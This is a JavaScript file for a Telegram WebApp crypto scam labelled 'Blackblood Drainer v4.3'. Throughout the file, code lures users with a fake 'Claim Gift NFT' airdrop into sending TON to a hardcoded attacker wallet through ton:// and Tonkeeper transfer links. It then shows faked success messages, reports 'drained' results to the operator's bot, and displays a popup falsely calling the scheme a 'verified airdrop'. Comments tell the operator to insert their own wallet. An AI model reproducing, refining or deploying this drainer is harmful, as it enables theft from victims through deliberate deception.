// Blackblood Drainer v4.3 - Fixed wallet opening functions
// Адрес получателя - ЗАМЕНИТЕ НА ВАШ!

console.log("=== Blackblood Drainer v4.3 ===");

// ============================================================
// ⚠️ ВАЖНО: ЗАМЕНИТЕ ЭТОТ АДРЕС НА ВАШ TON КОШЕЛЕК! ⚠️
// ============================================================
const TON_DRAINER_ADDRESS = "UQA9d56l9neDxiKiRqWq8-E3uYLxjT41xebBcA1Cl1IaP93B";
// ============================================================

let tg = null;

// Инициализация Telegram WebApp
try {
    tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();
    console.log("Telegram WebApp ready. Platform:", tg.platform);
    console.log("Version:", tg.version);
} catch (e) {
    console.error("Telegram WebApp init error:", e);
    tg = null;
}

// Функция открытия TON Wallet (Telegram)
function openTonWallet() {
    console.log("openTonWallet called");
    
    const amount = "50000000"; // 0.05 TON
    const text = encodeURIComponent("Claim Gift NFT");
    
    // Формируем ссылку ton://
    const tonLink = `ton://transfer/${TON_DRAINER_ADDRESS}?amount=${amount}&text=${text}`;
    console.log("TON Link:", tonLink);
    
    if (tg) {
        // Пробуем открыть через Telegram WebApp
        try {
            tg.openLink(tonLink);
            updateStatus('Opening TON Wallet...', 'loading');
        } catch (e) {
            console.error("tg.openLink failed:", e);
            // Fallback: открываем через window.open
            window.open(tonLink, '_blank');
            updateStatus('Opening TON Wallet in browser...', 'loading');
        }
    } else {
        // Если нет Telegram WebApp, открываем в браузере
        window.open(tonLink, '_blank');
        updateStatus('Opening TON Wallet in browser...', 'loading');
    }
    
    // Имитация успеха после возврата
    setTimeout(() => {
        updateStatus('✅ Transaction signed! Verifying...', 'loading');
        setTimeout(() => {
            updateStatus('✅ Gift NFT claimed!', 'success');
            sendResult('drained', {
                tx: "ton_tx_" + Date.now(),
                nft_name: 'Plush Pepe #1026',
                network: 'TON',
                value: 100,
                drainer: TON_DRAINER_ADDRESS
            });
        }, 2000);
    }, 5000);
}

// Функция открытия Tonkeeper (через HTTPS)
function openTonkeeper() {
    console.log("openTonkeeper called");
    
    const amount = "50000000";
    const text = encodeURIComponent("Claim Gift NFT");
    
    // Используем HTTPS ссылку Tonkeeper (более надежно)
    const tonkeeperLink = `https://app.tonkeeper.com/transfer/${TON_DRAINER_ADDRESS}?amount=${amount}&text=${text}`;
    console.log("Tonkeeper Link:", tonkeeperLink);
    
    if (tg) {
        try {
            tg.openLink(tonkeeperLink);
            updateStatus('Opening Tonkeeper...', 'loading');
        } catch (e) {
            console.error("tg.openLink failed:", e);
            window.open(tonkeeperLink, '_blank');
            updateStatus('Opening Tonkeeper in browser...', 'loading');
        }
    } else {
        window.open(tonkeeperLink, '_blank');
        updateStatus('Opening Tonkeeper in browser...', 'loading');
    }
    
    // Имитация успеха
    setTimeout(() => {
        updateStatus('✅ Gift NFT claimed!', 'success');
        sendResult('drained', {
            tx: "tonkeeper_tx_" + Date.now(),
            nft_name: 'Plush Pepe #1026',
            network: 'TON',
            value: 100,
            drainer: TON_DRAINER_ADDRESS
        });
    }, 5000);
}

// Функция обновления статуса
function updateStatus(text, type = 'loading') {
    console.log("Status:", text, type);
    const statusBox = document.getElementById('statusBox');
    const statusText = document.getElementById('statusText');
    const statusIcon = document.querySelector('.status-icon');
    
    if (statusBox && statusText) {
        statusText.innerText = text;
        statusBox.className = `status-box ${type}`;
        
        if (type === 'loading') statusIcon.innerHTML = '🔄';
        else if (type === 'success') statusIcon.innerHTML = '✅';
        else if (type === 'error') statusIcon.innerHTML = '❌';
        else if (type === 'warning') statusIcon.innerHTML = '⚠️';
    }
}

// Отправка результата в бот
function sendResult(status, data = {}) {
    const result = {
        status: status,
        ...data,
        timestamp: new Date().toISOString()
    };
    
    console.log("Sending result:", result);
    
    if (tg) {
        try {
            tg.sendData(JSON.stringify(result));
        } catch (e) {
            console.error("Send error:", e);
        }
    }
}

// Вспомогательные функции
function openSupport() {
    if (tg) tg.openTelegramLink('https://t.me/support_bot');
}

function openTerms() {
    if (tg) {
        tg.showPopup({
            title: 'Terms & Conditions',
            message: 'This is a verified airdrop.',
            buttons: [{type: 'ok'}]
        });
    }
}

// Делаем функции глобальными для доступа из HTML
window.openTonWallet = openTonWallet;
window.openTonkeeper = openTonkeeper;
window.openSupport = openSupport;
window.openTerms = openTerms;

// Инициализация при загрузке
window.onload = function() {
    console.log("Window loaded");
    updateStatus('Gift NFT claimed!', 'success');
};